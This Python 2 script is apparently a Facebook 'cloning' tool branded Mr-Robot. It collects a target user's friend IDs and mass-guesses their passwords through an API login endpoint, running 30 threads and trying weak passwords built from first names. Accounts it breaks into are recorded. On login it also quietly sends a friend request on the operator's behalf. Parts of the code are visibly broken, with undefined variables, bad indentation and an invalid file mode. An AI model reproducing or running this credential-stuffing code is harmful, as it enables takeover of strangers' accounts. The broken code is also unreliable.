#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Sayyed-Zakarya
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Target.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print 'God by Frends '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:Sayyed-Zakarya
##### LOGO #####
logo = """
\033[1;94m  ___   _____  _     _  _     _  ___    ___   
\033[1;91m(  _ \(  _  )( )   ( )( )   ( )(  _ \ (  _ \ 
\033[1;92m | (_(_) (_) | \ \_/ /  \ \_/ / | (_(_)| | ) |
\033[1;93m  \__ \(  _  )   \ /      \ /   |  _)_ | | | )
\033[1;95m ( )_) | | | |   | |      | |   | (_( )| |_) |
\033[1;97m  \(___)_) (_)   (_)      (_)   (____/ (____/ 
\033[1;94m  (_)                                         
\033[1;96m
\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
\033[1;97m                /(                                 
\033[1;94m               (__)                                     
\033[1;93m\033[1;92m«ã\033[1;93m«ã WhatsApp Num \033[1;94m«ã\033[1;95m«ã\033[1;93m  \033[1;96m«ã\033[1;93m«ã 03472860857 \033[1;92m«ã\033[1;95m«ã""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print logo  """
 \033[1;96m▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄  
 \033[1;91m█       █      █  █ █  █  █ █  █       █      █ 
 \033[1;92m█  ▄▄▄▄▄█  ▄   █  █▄█  █  █▄█  █    ▄▄▄█  ▄    █
 \033[1;93m█ █▄▄▄▄▄█ █▄█  █       █       █   █▄▄▄█ █ █   █
 \033[1;95m█▄▄▄▄▄  █      █▄     ▄█▄     ▄█    ▄▄▄█ █▄█   █
 \033[1;96m ▄▄▄▄▄█ █  ▄   █ █   █   █   █ █   █▄▄▄█       █
 \033[1;96m█▄▄▄▄▄▄▄█▄█ █▄▄█ █▄▄▄█   █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄▄▄▄█ 

                                                                                       
\033[1;96m███████╗ █████╗ ██╗  ██╗ █████╗ ██████╗ ██╗   ██╗ █████╗ 
\033[1;95m╚══███╔╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗
\033[1;94m  ███╔╝ ███████║█████╔╝ ███████║██████╔╝ ╚████╔╝ ███████║
\033[1;93m ███╔╝  ██╔══██║██╔═██╗ ██╔══██║██╔══██╗  ╚██╔╝  ██╔══██║
\033[1;92m███████╗██║  ██║██║  ██╗██║  ██║██║  ██║   ██║   ██║  ██║
\033[1;91m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
"""					

CorrectUsername = "Zakrya"
CorrectPassword = "Mr-Robot"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m? \x1b[1;91mTool Username \x1b[1;97m?? \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m? \x1b[1;91mTool Password  \x1b[1;97m?? \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Sayyed_Zakarya
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
        print "\033[1;95m?-----------------\033[1;91mMr-Robot\033[1;95m---------------?"
        time.sleep(0.05)
	print "\033[1;93m-???-\033[1;91m> \033[1;91m1.\x1b[1;93m«ã Login  Facebook "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;91m> \033[1;91m2.\x1b[1;95m«ã Login  Using Token"
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;91m> \033[1;91m3.\x1b[1;97m«ã Get Access Token App Fb"
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;91m> \033[1;93m4.\x1b[1;94m«ã Mr-Robot WhatsApp Group   "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;91m> \033[1;93m5.\x1b[1;91m«ã Mr-Robot  Youtube Chenal   "
        time.sleep(0.05)
	print "\033[1;93m-???-\033[1;91m> \033[1;91m0.\033[1;91m«ã Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
        elif peak =="4":
		os.system('xdg-open https://chat.whatsapp.com/C9VZx0EQQJ07TVeW80qgDe')
	        login()
        elif peak =="5":
	        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[«ã] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[«ã] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.???..'
				os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Sayyed_Zakarya
        time.sleep(0.05)
	print "\033[1;94m    ?-------\033[1;96mLogged in User Info\033[1;93m----------?"
        time.sleep(0.05)
	print "	   \033[1;93m ?----«ãName\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   \033[1;93m ?----«ãID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
        time.sleep(0.05)
        print "\033[1;95m?-----------------\033[1;91mMr-Rebot\033[1;95m---------------?"
        time.sleep(0.05)
	    print "\033[1;93m-???-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m«ã Start    Cloning Mr-Rebot   "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m«ã Start    Target  Hacking        "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m«ã Facebook Report  BlackMafia      "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95m«ã Friend's User    information      "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96m«ã ID Not   Found   Problum solve  "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m8 .\033[1;96m\033[1;93m«ã Mr-Robot  Youtube Chenal   "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m9 .\033[1;96m\033[1;92m«ã Login    Using   Token          "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m10.\033[1;96m\033[1;91m«ã Show     Token   login/ID       "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m11.\033[1;96m\033[1;96m«ã Tool     Rest &  Update         "
        time.sleep(0.05)
	print "\033[1;93m-???-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91m«ã logout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		fighter()
        elif unikers =="4":
		asif()
        elif unikers =="5":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
		menu()
        elif unikers =="7":
		os.system('xdg-open https://chat.whatsapp.com/C9VZx0EQQJ07TVeW80qgDe')
	        menu()
        elif unikers =="8":
	        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
	        menu()
        elif unikers =="9":
		tokenz()
        elif unikers =="10":
		os.system('reset')
		print 
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
		menu()
	elif unikers =="11":
		os.system('clear')
		print "\033[1;95m?-----------------\033[1;91mDataReset\033[1;95m---------------?"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print "\033[1;93m-???-\033[1;93m> \033[1;93m1 .\x1b[1;95m«ã Start Cloning Pakistan       "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m2 .\x1b[1;95m«ã Start Cloning India          "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m3 .\x1b[1;95m«ã Start Cloning Indonasia      "
        time.sleep(0.05)
	print "\033[1;93m-???-\033[1;91m> \033[1;91m0 .\033[1;91m«ã Back"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;95m?-----------------\033[1;91mMr-Robot\033[1;95m---------------?"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			crack()
		print"\033[1;93mGetting IDs\033[1;93m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
        elif peak =="2":
	        super()
        elif peak =="3":
	        hack()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m?-----\x1b[1;91m¡¾To Stop Process Press CTRL+Z¡¿\033[1;97m----?"
	print "\033[1;97m?--------------------\033[1;92m?\033[1;97m------------------?"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Pakistan ')
	print "\033[1;97m?--------------------\033[1;92m?\033[1;97m------------------?"
	
		def main(arg):
		global cekpoint,sucessful
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:Sayyed-Zakarya
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + y['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = y['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m???????????????????\033[1;91mBlackMafia\033[1;95m???????????????????"
	print '\033[1;95mProcess Has Been Completed Press? Type 0 Enter? Next Type 0 (Back)?\033[1;97m....'
        print '\033[1;95mNext Type (python2 Target.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;92m"+str(len(oks))+"\033[1;95m/\033[1;91m"+str(len(cekpoint))
	
	def hack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print "\033[1;97m-???-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-???-\033[1;91m> \033[1;91m0.\033[1;91mBack"
	pilih_hack()

def pilih_hack():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;95m[???] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
		print "\033[1;95m???????????????????\033[1;91mMr-Robot\033[1;95m???????????????????"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			hack()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_hack()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m?-----\x1b[1;91m¡¾To Stop Process Press CTRL+Z¡¿\033[1;97m----?"
	print "\033[1;97m?--------------------\033[1;92m?\033[1;97m------------------?"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m         Start Cloning Indonasia ')
	print "\033[1;97m?--------------------\033[1;92m?\033[1;97m------------------?"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Sayyed_Zakarya
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('Kantol123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Sayang123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
